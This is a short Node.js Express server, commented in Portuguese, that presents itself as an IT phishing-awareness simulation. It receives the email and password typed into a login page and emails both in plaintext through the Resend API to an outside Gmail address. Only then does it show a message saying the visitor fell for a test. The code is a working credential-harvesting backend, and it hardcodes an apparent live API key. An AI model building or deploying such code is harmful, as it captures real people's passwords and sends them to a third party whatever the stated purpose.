const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const { Resend } = require('resend');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Inicializa Resend com sua API Key
const resend = new Resend('re_bjc3V1g6_JDBHpPnr1vUPjMASnzUa46MA');

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/', async (req, res) => {
  const { email, senha } = req.body;

  try {
    await resend.emails.send({
      from: 'simulacao@connect.com',
      to: 'smtptesteenvio1@gmail.com',
      subject: 'Dados capturados na simulação',
      html: `<p><strong>Email:</strong> ${email}<br><strong>Senha:</strong> ${senha}</p>`
    });

    res.send(`
      <h2 style="font-family:Arial; color:#c62828; text-align:center; margin-top:100px;">
        Você acaba de cair em um teste de phishing.
      </h2>
      <p style="text-align:center; font-family:Arial;">
        Esta é uma simulação de segurança realizada pela equipe de TI para fins de conscientização.
      </p>
    `);
  } catch (error) {
    console.error('Erro ao enviar email:', error);
    res.send('Erro ao processar os dados.');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
